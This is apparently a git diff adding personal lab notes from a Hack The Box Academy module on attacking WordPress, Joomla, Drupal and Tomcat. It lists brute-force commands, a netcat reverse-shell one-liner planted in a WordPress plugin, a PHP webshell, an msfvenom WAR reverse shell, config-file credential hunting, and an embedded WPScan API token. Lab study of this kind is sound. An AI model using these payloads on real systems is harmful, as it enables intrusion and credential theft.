@@ -47,3 +47,138 @@ cat web_discovery.xml | /home/kali/Downloads/htb/academy/common-apps/aquatone -n
 | [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)              | A simple Splunk package for obtaining reverse shells on Windows and Linux systems |
 |                                                              |                                                              |
 |                                                              |                                                              |
+
+
+# Common Applications Exercises  
+
+## WordPress  
+
+>[WordPress - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1100)  
+>WPScan enumerate target:
+```
+sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token rfzQVksSGlICnUWX6uY4RxW9tCuwcRaJvwqWyfEalSk
+```  
+
+>Identified the user `doug`, Brute force password:
+```
+sudo wpscan --url http://blog.inlanefreight.local/ --passwords /usr/share/wordlists/rockyou.txt --usernames doug -t 25 --api-token rfzQVksSGlICnUWX6uY4RxW9tCuwcRaJvwqWyfEalSk
+```
+
+>Cracked password for Wordpress user `doug`:`jessica1`.
+
+### WordPress Attack Chain  
+
++ Login to wordpress, as `doug`:`jessica1` with aim to get Reverse shell
++ Deactivate plugin `akismet/akismet.php`
++ Edit top of PHP page for plugin with reverse shell `<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.38 443 >/tmp/f")?>` 
++ Start netcat listener on port 433, `rlwrap nc -nvlp 443`
++ Activate plugin, `akismet/akismet.php`
++ In low shell, upgrade to full interactive shell, `python3 -c 'import pty;pty.spawn("/bin/bash")'`
++ Find flag.txt, `find / -name flag.txt -type f -exec ls -la {} \; 2>/dev/null`
++ Enumerate local users `ls -al /home`
++ Find users locally with login shell `bash` access: `cat /etc/passwd | grep -ie 'sh'`
++ Identify contents of web root directories and folders: `ls -al /var/www/`
++ Password hunting in config files, `cat wp-config.php`. Found credentials for MySQL database username `wordpressadm:`HTB_@cademy_WP!`
++ MySQL enumeration on local `mysql -u wordpressadm -p`, and list `select user_login,user_pass from wp_users;`
+
+## Joomla
+
+>[Joomla - Discovery Enumeration Attack](https://academy.hackthebox.com/module/113/section/1095)
+
+### Joomla Attack Chain  
+
+>Enumeration droopescan `droopescan scan joomla --url http://app.inlanefreight.local`
+>[joomla Brute force login](https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py): `sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin`
+
+>Credentials discovered via brute force: `admin:turnkey`  
+
+>Enumeration using the low shell obtained via ***WordPress***:  
+
+```
+cd /var/www/app.inlanefreight.local
+```
+
+>Information gathered:  
+
+* cat configuration.php - `joomlaadm`:`HTB_@caedmy_Joomla!`  
+* cat htaccess.txt
+* cat index.html.bak
+
+```
+cd /var/www/dev.inlanefreight.local
+cat configuration.php - `joomlaadm`:`HTB_@caedmy_Joomla!`  
+```  
+
+>[Joomla Authenticated reverse shell](https://academy.hackthebox.com/module/113/section/1210)  
+
+## Drupal  
+
+### Discovery & Enumeration  
+
+>[Drupal - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1089)  
+
+>Enumeration: `droopescan scan drupal -u http://drupal.inlanefreight.local`
+
+>Enumeration of Drupal backend using the low shell obtained via ***WordPress***:  
+
+```
+cd /var/www/drupal.inlanefreight.local
+
+find . | grep --color=auto -nr -ie "passw" --color=always 2>/dev/null
+```  
+
+>[Attacking Drupal]{https://academy.hackthebox.com/module/113/section/1209)  
+>Authentication to Drupal `admin`:`admin`
+
+>After enable PHP filters on Drupal, Create basic page with payload that allow use of PHP webshell:  
+
+```php
+<?php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+?>
+```  
+
+>WebShell Usage:
+```
+curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">
+```  
+
+## Tomcat  
+
+>[Tomcat - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1090)  
+
+>web directory enumeration:  
+```
+gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+```  
+
+### Tomcat Attack Chain  
+
+>Brute force basic authentication with MSFCONSOLE - `msf6 auxiliary scanner/http/tomcat_mgr_login`
+
+>Alternative: [mgr_brute.py](https://raw.githubusercontent.com/b33lz3bub-1/Tomcat-Manager-Bruteforce/master/mgr_brute.py)  
+
+```
+set VHOST web01.inlanefreight.local
+set RPORT 8180
+set stop_on_success true
+set rhosts 10.129.201.58
+set USER_FILE /home/kali/Downloads/htb/academy/common-apps/tomcat.txt
+run
+```  
+
+>Login Successful: tomcat:root
+
+>[Tomcat Manager - WAR File Upload](https://academy.hackthebox.com/module/113/section/1211)  
+>Msfvenom payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.38 LPORT=4443 -f war > backup.war`  
+>Start Listener: `sudo msfconsole; use exploit/multi/handler; run`  
+
+>Tomcat Manager - WAR File Upload [http://web01.inlanefreight.local:8180/manager/html](http://web01.inlanefreight.local:8180/manager/html) - WAR file to deploy `backup.war`
+
+>Execute WAR file to connect reverse shell, after it been uploaded.  
+
+>Obtained remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. 
+>Find and submit the contents of `find / -name tomcat_flag.txt -type f -exec ls -la {} \; 2>/dev/null`
+
+>Flag : `cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`.  
+  
